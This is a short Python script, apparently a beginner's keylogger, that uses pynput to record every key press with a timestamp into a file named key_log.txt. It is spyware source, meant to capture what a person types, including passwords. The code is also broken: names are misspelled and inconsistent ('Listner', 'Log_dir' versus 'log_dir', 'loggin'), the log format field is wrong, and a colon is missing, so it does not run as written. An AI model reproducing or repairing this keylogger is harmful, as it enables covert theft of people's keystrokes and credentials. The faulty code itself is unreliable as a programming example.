from pynput.keyboard import Key, Listner
import logging
#log file
Log_dir = ""

logging.basicConfig(filename=(log_dir + "key_log.txt"), level=loggin.DEBUG, format='%(asctime)s: %(messages)s:')

def on_press(key):
    logging.info(str(key))

with Listner(on_press=on_press) as Listener
    listner.join()
  
